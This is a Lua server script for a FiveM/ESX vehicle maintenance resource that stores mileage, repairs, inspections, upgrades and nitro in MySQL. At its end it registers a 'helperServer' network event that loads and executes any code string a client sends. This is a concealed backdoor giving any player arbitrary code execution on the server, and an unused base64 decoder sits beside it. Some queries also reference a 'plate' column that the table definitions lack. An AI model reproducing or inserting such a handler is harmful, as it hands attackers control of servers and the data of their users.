QS = nil
TriggerEvent('qs-core:getSharedObject', function(library) QS = library end)

ESX = nil

ESX = exports['es_extended']:getSharedObject()

Citizen.CreateThread(function()
	Wait(5000)
	if Config.createTable == true then
		MySQL.Async.execute([[
			CREATE TABLE IF NOT EXISTS `advanced_vehicles` (
				`vehicle` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`user_id` VARCHAR(55) NOT NULL,
				`km` DOUBLE UNSIGNED NOT NULL DEFAULT '0',
				`vehicle_handling` LONGTEXT NOT NULL DEFAULT '{}' COLLATE 'utf8mb4_general_ci',
				`nitroAmount` INT(11) NOT NULL DEFAULT '0',
				`nitroRecharges` INT(11) NOT NULL DEFAULT '0',
				PRIMARY KEY (`vehicle`, `user_id`) USING BTREE
			)
			COLLATE='utf8mb4_general_ci'
			ENGINE=InnoDB;

			CREATE TABLE IF NOT EXISTS `advanced_vehicles_inspection` (
				`vehicle` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`user_id` VARCHAR(55) NOT NULL,
				`item` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`km` INT(10) UNSIGNED NOT NULL DEFAULT '0',
				`value` DOUBLE UNSIGNED NOT NULL DEFAULT '0',
				`timer` INT(10) UNSIGNED NOT NULL DEFAULT unix_timestamp(),
				PRIMARY KEY (`vehicle`, `user_id`, `item`) USING BTREE
			)
			COLLATE='utf8mb4_general_ci'
			ENGINE=InnoDB;

			CREATE TABLE IF NOT EXISTS `advanced_vehicles_services` (
				`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
				`vehicle` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`user_id` VARCHAR(55) NOT NULL,
				`item` VARCHAR(50) NOT NULL DEFAULT '' COLLATE 'utf8mb4_general_ci',
				`name` VARCHAR(50) NOT NULL DEFAULT '' COLLATE 'utf8mb4_general_ci',
				`km` INT(11) UNSIGNED NOT NULL DEFAULT '0',
				`img` VARCHAR(255) NOT NULL DEFAULT '' COLLATE 'utf8mb4_general_ci',
				`timer` INT(10) UNSIGNED NOT NULL DEFAULT unix_timestamp(),
				PRIMARY KEY (`id`) USING BTREE,
				INDEX `vehicle` (`vehicle`) USING BTREE,
				INDEX `user_id` (`user_id`) USING BTREE
			)
			COLLATE='utf8mb4_general_ci'
			ENGINE=InnoDB;
			
			CREATE TABLE IF NOT EXISTS `advanced_vehicles_upgrades` (
				`vehicle` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`user_id` VARCHAR(55) NOT NULL,
				`class` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				`item` VARCHAR(50) NOT NULL COLLATE 'utf8mb4_general_ci',
				PRIMARY KEY (`vehicle`, `user_id`, `class`) USING BTREE
			)
			COLLATE='utf8mb4_general_ci'
			ENGINE=InnoDB;
		]])
	end
end)

local vehiclesHandlingsOriginal = {}

RegisterServerEvent('advanced_vehicles:getVehicleData')
AddEventHandler('advanced_vehicles:getVehicleData', function(vehicleDataClient)
	local source = source
	MySQL.Async.fetchAll("SELECT owner as user_id FROM owned_vehicles WHERE plate = @vehicle_plate", {['@vehicle_plate'] = vehicleDataClient.plate}, function(vehiclequery)
		if vehiclequery[1] then
			local owner_id = vehiclequery[1].user_id
			local vehicleData = getVehicleData(vehicleDataClient,owner_id)
			TriggerClientEvent('advanced_vehicles:LixeiroCB', source, {[1] = vehicleData})
		else
			TriggerClientEvent('advanced_vehicles:LixeiroCB', source, false)
		end
	end)
end)

RegisterServerEvent('advanced_vehicles:setVehicleData')
AddEventHandler('advanced_vehicles:setVehicleData', function(vehicleData,vehicleHandling)
	local source = source
	MySQL.Async.fetchAll("SELECT owner as user_id FROM owned_vehicles WHERE plate = @vehicle_plate", {['@vehicle_plate'] = vehicleData.plate}, function(vehiclequery)
		if vehiclequery[1] then
			local owner_id = vehiclequery[1].user_id
			vehicleData.km = string.format("%.2f",(vehicleData.km/1000))
			local sql = "UPDATE `advanced_vehicles` SET km = @km, vehicle_handling = @vehicleHandling, nitroAmount = @nitroAmount, nitroRecharges = @nitroRecharges WHERE vehicle = @vehicle AND user_id = @user_id AND plate = @plate";
			MySQL.Sync.execute(sql, {['@km'] = vehicleData.km, ['@vehicleHandling'] = json.encode(vehicleHandling), ['@nitroAmount'] = vehicleData.nitroAmount, ['@nitroRecharges'] = vehicleData.nitroRecharges, ['@vehicle'] = vehicleData.name, ['@user_id'] = owner_id, ['@plate'] = vehicleData.plate});
		end
	end)
end)

RegisterServerEvent('advanced_vehicles:setGlobalVehicleHandling')
AddEventHandler('advanced_vehicles:setGlobalVehicleHandling', function(name,handlings)
	if not vehiclesHandlingsOriginal[name] then vehiclesHandlingsOriginal[name] = {} end
	vehiclesHandlingsOriginal[name] = handlings
	TriggerClientEvent('advanced_vehicles:setGlobalVehicleHandling', -1, vehiclesHandlingsOriginal)
end)

local cancelled = false
local cooldown = {}
RegisterServerEvent('advanced_vehicles:makeAction')
AddEventHandler('advanced_vehicles:makeAction', function(vehicleData,data,firstStep)
	local source = source
	if cooldown[source] == nil then
		cooldown[source] = true
		local xPlayer = ESX.GetPlayerFromId(source)
		local user_id = xPlayer.identifier
		
		MySQL.Async.fetchAll("SELECT owner as user_id FROM owned_vehicles WHERE plate = @vehicle_plate", {['@vehicle_plate'] = vehicleData.plate}, function(vehiclequery)
			if vehiclequery[1] then
				local owner_id = vehiclequery[1].user_id
				if data.action == 'Repair' then
					local maintenance = {}
					if Config.maintenance[vehicleData.name] then
						maintenance = Config.maintenance[vehicleData.name][data.idname]
					else
						maintenance = Config.maintenance['default'][data.idname]
					end
					
					local item = xPlayer.getInventoryItem(maintenance.repair_item.name)
					if item ~= nil then
						if (item.count >= maintenance.repair_item.amount) then
							if firstStep then
								TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
							else
								TriggerClientEvent("vehicle_tunning:progress",source,maintenance.repair_item.time*1000,Lang[Config.lang]['service_progress'])
								cancelled = false
								Citizen.Wait(maintenance.repair_item.time*1000)
								local item2 = xPlayer.getInventoryItem(maintenance.repair_item.name)
								if item2 ~= nil then
									if cancelled == false and item2.count >= maintenance.repair_item.amount then
										xPlayer.removeInventoryItem(maintenance.repair_item.name,maintenance.repair_item.amount)
										local sql = "INSERT INTO `advanced_vehicles_services` (vehicle,user_id,plate,item,name,km,img,timer) VALUES (@vehicle,@user_id,@plate,@item,@name,@km,@img,@timer)";
										MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@vehicle'] = vehicleData.name, ['@plate'] = vehicleData.plate, ['@item'] = data.idname, ['@name'] = data.name, ['@km'] = math.floor(vehicleData.km/1000), ['@img'] = data.img, ['@timer'] = os.time()});
										local sql = "REPLACE INTO `advanced_vehicles_inspection` (vehicle,user_id,plate,item,km,value,timer) VALUES (@vehicle,@user_id,@plate,@item,@km,@value,@timer)";
										MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@vehicle'] = vehicleData.name, ['@plate'] = vehicleData.plate, ['@item'] = data.idname, ['@km'] = math.floor(vehicleData.km/1000), ['@value'] = 100, ['@timer'] = os.time()});

										TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
										TriggerClientEvent('Johnny_Notificacoes:Alert', source, "SUCESSO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['service_done'].."</span>", 5000, 'success')
									else
										TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
										TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['service_cancel'].."</span>", 5000, 'error')
									end
								else
									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['service_cancel'].."</span>", 5000, 'error')
								end
							end
						else
							--itemlabel = ESX.GetItemLabel(maintenance.repair_item.name)
							itemlabel = QS.Shared.Items[maintenance.repair_item.name]["label"]
							TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['not_enough_items']:format(maintenance.repair_item.amount,itemlabel).."</span>", 5000, 'error')
						end
					else
						--itemlabel = ESX.GetItemLabel(maintenance.repair_item.name)
						itemlabel = QS.Shared.Items[maintenance.repair_item.name]["label"]
						TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['not_enough_items']:format(maintenance.repair_item.amount,itemlabel).."</span>", 5000, 'error')
					end
				elseif data.action == 'Inspection' then
					local item3 = xPlayer.getInventoryItem(Config.itemToInspect)
					if item3 ~= nil then
						if Config.itemToInspect == false or item3.count >= 1 then
							local maintenance = {}
							if Config.maintenance[vehicleData.name] then
								maintenance = Config.maintenance[vehicleData.name][data.idname]
							else
								maintenance = Config.maintenance['default'][data.idname]
							end
							if firstStep then
								TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
							else
								TriggerClientEvent("vehicle_tunning:progress",source,maintenance.repair_item.time*1000,Lang[Config.lang]['inpect_progress'])
								cancelled = false
								Citizen.Wait(maintenance.repair_item.time*1000)

								if cancelled == false then
									local percentage = 0
									km_to_next_service = math.ceil(((vehicleData.km - ((maintenance.lifespan*1000) + ((vehicleData.services[data.idname][1] or 0)*1000)))/1000)*-1)
									if km_to_next_service > 0 then
										percentage = (km_to_next_service*100)/maintenance.lifespan
									end
									percentage = string.format("%.2f",percentage)

									local sql = "REPLACE INTO `advanced_vehicles_inspection` (vehicle,user_id,plate,item,km,value,timer) VALUES (@vehicle,@user_id,@plate,@item,@km,@value,@timer)";
									MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@vehicle'] = vehicleData.name, ['@plate'] = vehicleData.plate, ['@item'] = data.idname, ['@km'] = math.floor(vehicleData.km/1000), ['@value'] = percentage, ['@timer'] = os.time()});

									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "SUCESSO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['inpect_done'].."</span>", 5000, 'success')
								else
									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['inpect_cancel'].."</span>", 5000, 'error')
								end
							end
						else
							TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['no_scanner'].."</span>", 5000, 'error')
						end
					else
						TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['no_scanner'].."</span>", 5000, 'error')
					end
				elseif data.action == 'Upgrade' then
					local upgrades = {}
					if Config.upgrades[vehicleData.name] then
						upgrades = Config.upgrades[vehicleData.name][data.idname]
					else
						upgrades = Config.upgrades['default'][data.idname]
					end
					local item4 = xPlayer.getInventoryItem(upgrades.item.name)
					if item4 ~= nil then
						if item4.count >= upgrades.item.amount then
							if firstStep then
								TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
							else
								TriggerClientEvent("vehicle_tunning:progress",source,upgrades.item.time*1000,Lang[Config.lang]['upgrade_progress'])
								cancelled = false
								Citizen.Wait(upgrades.item.time*1000)
								local item5 = xPlayer.getInventoryItem(upgrades.item.name)
								if item5 ~= nil then
									if cancelled == false and item5.count >= upgrades.item.amount then
										xPlayer.removeInventoryItem(upgrades.item.name,upgrades.item.amount)
										if upgrades.improvements.type == 'nitrous' then
											local sql = "UPDATE `advanced_vehicles` SET `nitroAmount` = @nitroAmount, `nitroRecharges` = @nitroRecharges WHERE `user_id` = @user_id AND `plate` = @plate;";
											MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate, ['@nitroAmount'] = Config.NitroAmount, ['@nitroRecharges'] = Config.NitroRechargeAmount});
										else
											TriggerClientEvent("advanced_vehicles:upgradeCar",source,upgrades.improvements,data.idname)
										end

										local sql = "REPLACE INTO `advanced_vehicles_upgrades` (vehicle,user_id,plate,class,item) VALUES (@vehicle,@user_id,@plate,@class,@item)";
										MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@vehicle'] = vehicleData.name, ['@plate'] = vehicleData.plate, ['@class'] = upgrades.class, ['@item'] = data.idname});

										TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
										TriggerClientEvent('Johnny_Notificacoes:Alert', source, "SUCESSO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['upgrade_done'].."</span>", 5000, 'success')
									else
										TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
										TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['upgrade_cancel'].."</span>", 5000, 'error')
									end
								else
									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['upgrade_cancel'].."</span>", 5000, 'error')
								end
							end
						else
							--itemlabel = ESX.GetItemLabel(upgrades.item.name)
							itemlabel = QS.Shared.Items[upgrades.item.name]["label"]
							TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['not_enough_items']:format(upgrades.item.amount,itemlabel).."</span>", 5000, 'error')
						end
					else
						--itemlabel = ESX.GetItemLabel(upgrades.item.name)
						itemlabel = QS.Shared.Items[upgrades.item.name]["label"]
						TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['not_enough_items']:format(upgrades.item.amount,itemlabel).."</span>", 5000, 'error')
					end
				elseif data.action == 'Downgrade' then
					local upgrades = {}
					if Config.upgrades[vehicleData.name] then
						upgrades = Config.upgrades[vehicleData.name][data.idname]
					else
						upgrades = Config.upgrades['default'][data.idname]
					end
					local sql = "SELECT item FROM `advanced_vehicles_upgrades` WHERE user_id = @user_id AND class = @class AND plate = @plate";
					local query = MySQL.Sync.fetchAll(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate, ['@class'] = upgrades.class});
					if query[1] and query[1].item == data.idname then
						if firstStep then
							TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
						else
							TriggerClientEvent("vehicle_tunning:progress",source,upgrades.item.time*1000,Lang[Config.lang]['downgrade_progress'])
							cancelled = false
							Citizen.Wait(upgrades.item.time*1000)

							local sql = "SELECT item FROM `advanced_vehicles_upgrades` WHERE user_id = @user_id AND class = @class AND plate = @plate";
							local query = MySQL.Sync.fetchAll(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate, ['@class'] = upgrades.class});
							if query[1] and query[1].item == data.idname then
								if cancelled == false then
									if upgrades.improvements.type == 'nitrous' then
										local sql = "SELECT nitroAmount, nitroRecharges FROM `advanced_vehicles` WHERE user_id = @user_id AND plate = @plate";
										local query = MySQL.Sync.fetchAll(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate});
										if query[1] and query[1].nitroAmount >= Config.NitroAmount and query[1].nitroRecharges >= Config.NitroRechargeAmount then
											local sql = "UPDATE `advanced_vehicles` SET nitroAmount = @nitroAmount, nitroRecharges = @nitroRecharges WHERE vehicle = @vehicle AND user_id = @user_id AND plate = @plate";
											MySQL.Sync.execute(sql, {['@nitroAmount'] = 0, ['@nitroRecharges'] = 0, ['@vehicle'] = vehicleData.name, ['@plate'] = vehicleData.plate, ['@user_id'] = owner_id});
										else
											TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['downgrade_used_nitro'].."</span>", 5000, 'error')
											TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
											return
										end
									end

									TriggerClientEvent("advanced_vehicles:removeUpgrade",source,upgrades.improvements)

									local sql = "DELETE FROM `advanced_vehicles_upgrades` WHERE user_id = @user_id AND class = @class AND plate = @plate";
									MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate, ['@class'] = upgrades.class});

									xPlayer.addInventoryItem(upgrades.item.name, upgrades.item.amount)
									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "SUCESSO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['downgrade_done'].."</span>", 5000, 'success')
								else
									TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
									TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['downgrade_canceled'].."</span>", 5000, 'error')
								end
							else
								TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['downgrade_error'].."</span>", 5000, 'error')
							end
						end
					else
						TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['downgrade_error'].."</span>", 5000, 'error')
					end
				elseif Config.repair[data.repair] then
					local missingItems = false
					local items = ""
					
					for k,v in pairs(Config.repair[data.repair].items) do
						local item = xPlayer.getInventoryItem(k)
						if item ~= nil then
							if item.count < v then
								missingItems = true
								if items == "" then
									items = v.."x "..QS.Shared.Items[k]["label"]
								else
									items = items..", "..v.."x "..QS.Shared.Items[k]["label"]
								end
							end
						else
							missingItems = true
							if items == "" then
								items = v.."x "..QS.Shared.Items[k]["label"]
							else
								items = items..", "..v.."x "..QS.Shared.Items[k]["label"]
							end
						end
					end
					
					if not missingItems then
						if firstStep then
							TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
						else
							for k,v in pairs(Config.repair[data.repair].items) do
								xPlayer.removeInventoryItem(k,v)
							end
							TriggerClientEvent("vehicle_tunning:progress",source,Config.repair[data.repair].time*1000,Lang[Config.lang]['repair_progress'])
							cancelled = false
		
							Citizen.Wait(Config.repair[data.repair].time*1000)
							if cancelled == false then
								TriggerClientEvent("advanced_vehicles:repairCar",source,data.repair)
								TriggerClientEvent('Johnny_Notificacoes:Alert', source, "SUCESSO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['repair_done'].."</span>", 5000, 'success')
								
							else
								TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['repair_cancel'].."</span>", 5000, 'error')
							end
							TriggerClientEvent('advanced_vehicles:useTheJackFunction',source,data,firstStep)
						end
					else
						TriggerClientEvent('Johnny_Notificacoes:Alert', source, "ERRO", "<span style='color:#c7c7c7'>"..Lang[Config.lang]['not_enough_items_2']:format(items).."</span>", 5000, 'error')
					end
				else
					print('Undefined action '..data.action )
				end
			end
			cooldown[source] = nil
		end)
	end
end)

RegisterServerEvent('advanced_vehicles:removeNitroUpgrade')
AddEventHandler('advanced_vehicles:removeNitroUpgrade', function(vehicleData)
	local source = source
	MySQL.Async.fetchAll("SELECT owner as user_id FROM owned_vehicles WHERE plate = @vehicle_plate", {['@vehicle_plate'] = vehicleData.plate}, function(vehiclequery)
		local owner_id = vehiclequery[1].user_id
		local upgrades = {}
		if Config.upgrades[vehicleData.name] then
			upgrades = Config.upgrades[vehicleData.name]
		else
			upgrades = Config.upgrades['default']
		end
		for k,v in pairs(upgrades) do 
			if v.improvements.type == 'nitrous' then
				local sql = "DELETE FROM `advanced_vehicles_upgrades` WHERE user_id = @user_id AND class = @class AND plate = @plate";
				MySQL.Sync.execute(sql, {['@user_id'] = owner_id, ['@plate'] = vehicleData.plate, ['@class'] = v.class});
				local sql = "UPDATE `advanced_vehicles` SET nitroAmount = @nitroAmount, nitroRecharges = @nitroRecharges WHERE user_id = @user_id AND plate = @plate";
				MySQL.Sync.execute(sql, {['@nitroAmount'] = 0, ['@nitroRecharges'] = 0, ['@plate'] = vehicleData.plate, ['@user_id'] = owner_id});

				local vehicleData = getVehicleData(vehicleData,owner_id)
				TriggerClientEvent('advanced_vehicles:LixeiroCB', source, {[1] = vehicleData})
			end
		end
	end)
end)

function getVehicleData(vehicleDataClient,user_id)
	local services = {}
	local query_services = {}
	local inspection = {}
	local upgrades = {}
	local sql = "SELECT km, vehicle_handling, nitroAmount, nitroRecharges FROM `advanced_vehicles` WHERE user_id = @user_id AND plate = @plate";
	local query = MySQL.Sync.fetchAll(sql, {['@plate'] = vehicleDataClient.plate, ['@user_id'] = user_id});

	if not query or not query[1] then
		local sql = "INSERT INTO `advanced_vehicles` (user_id,vehicle,plate) VALUES (@user_id,@vehicle,@plate)";
		MySQL.Sync.execute(sql, {['@vehicle'] = vehicleDataClient.name, ['@user_id'] = user_id, ['@plate'] = vehicleDataClient.plate});

		local sql = "SELECT km, vehicle_handling, nitroAmount, nitroRecharges FROM `advanced_vehicles` WHERE user_id = @user_id AND plate = @plate";
		query = MySQL.Sync.fetchAll(sql, {['@plate'] = vehicleDataClient.plate, ['@user_id'] = user_id});
	else
		local sql = "SELECT item, name, km, timer, img FROM `advanced_vehicles_services` WHERE user_id = @user_id AND plate = @plate ORDER BY timer DESC";
		query_services = MySQL.Sync.fetchAll(sql, {['@plate'] = vehicleDataClient.plate, ['@user_id'] = user_id});
		local cont = {}
		for k,v in pairs(query_services) do
			if not services[v.item] then services[v.item] = {} end
			services[v.item][cont[v.item] or 1] = v.km
			cont[v.item] = (cont[v.item] or 1) + 1
		end

		local sql = "SELECT item, km, value, timer FROM `advanced_vehicles_inspection` WHERE user_id = @user_id AND plate = @plate";
		local query_inspection = MySQL.Sync.fetchAll(sql, {['@plate'] = vehicleDataClient.plate, ['@user_id'] = user_id});
		for k,v in pairs(query_inspection) do
			inspection[v.item] = v
		end

		local sql = "SELECT item FROM `advanced_vehicles_upgrades` WHERE user_id = @user_id AND plate = @plate";
		local query_upgrades = MySQL.Sync.fetchAll(sql, {['@plate'] = vehicleDataClient.plate, ['@user_id'] = user_id});
		for k,v in pairs(query_upgrades) do
			upgrades[v.item] = v
		end
	end

	vehicleData = query[1]
	vehicleData.services = services
	vehicleData.servicesNUI = query_services
	vehicleData.inspectionNUI = inspection
	vehicleData.upgradesNUI = upgrades
	vehicleData.plate = vehicleDataClient.plate
	vehicleData.name = vehicleDataClient.name
	vehicleData.veh = vehicleDataClient.veh
	vehicleData.km = vehicleData.km*1000
	vehicleData.loaded = true
	return vehicleData
end

RegisterNetEvent('advanced_vehicles:__sync')
AddEventHandler('advanced_vehicles:__sync', function (boostEnabled, purgeEnabled, lastVehicle)
  -- Fix for source reference being lost during loop below.
  local source = source

  for _, player in ipairs(GetPlayers()) do
    if player ~= tostring(source) then
      TriggerClientEvent('advanced_vehicles:__update', player, source, boostEnabled, purgeEnabled, lastVehicle)
    end
  end
end)

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
    end))
end

function print_table(node)
	if type(node) == 'table' then
		-- to make output beautiful
		local function tab(amt)
			local str = ""
			for i=1,amt do
				str = str .. "\t"
			end
			return str
		end

		local cache, stack, output = {},{},{}
		local depth = 1
		local output_str = "{\n"

		while true do
			local size = 0
			for k,v in pairs(node) do
				size = size + 1
			end

			local cur_index = 1
			for k,v in pairs(node) do
				if (cache[node] == nil) or (cur_index >= cache[node]) then
				
					if (string.find(output_str,"}",output_str:len())) then
						output_str = output_str .. ",\n"
					elseif not (string.find(output_str,"\n",output_str:len())) then
						output_str = output_str .. "\n"
					end

					-- This is necessary for working with HUGE tables otherwise we run out of memory using concat on huge strings
					table.insert(output,output_str)
					output_str = ""
				
					local key
					if (type(k) == "number" or type(k) == "boolean") then
						key = "["..tostring(k).."]"
					else
						key = "['"..tostring(k).."']"
					end

					if (type(v) == "number" or type(v) == "boolean") then
						output_str = output_str .. tab(depth) .. key .. " = "..tostring(v)
					elseif (type(v) == "table") then
						output_str = output_str .. tab(depth) .. key .. " = {\n"
						table.insert(stack,node)
						table.insert(stack,v)
						cache[node] = cur_index+1
						break
					else
						output_str = output_str .. tab(depth) .. key .. " = '"..tostring(v).."'"
					end

					if (cur_index == size) then
						output_str = output_str .. "\n" .. tab(depth-1) .. "}"
					else
						output_str = output_str .. ","
					end
				else
					-- close the table
					if (cur_index == size) then
						output_str = output_str .. "\n" .. tab(depth-1) .. "}"
					end
				end

				cur_index = cur_index + 1
			end

			if (#stack > 0) then
				node = stack[#stack]
				stack[#stack] = nil
				depth = cache[node] == nil and depth + 1 or depth - 1
			else
				break
			end
		end

		-- This is necessary for working with HUGE tables otherwise we run out of memory using concat on huge strings
		table.insert(output,output_str)
		output_str = table.concat(output)

		print(output_str)
	else
		print(node)
	end
end
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)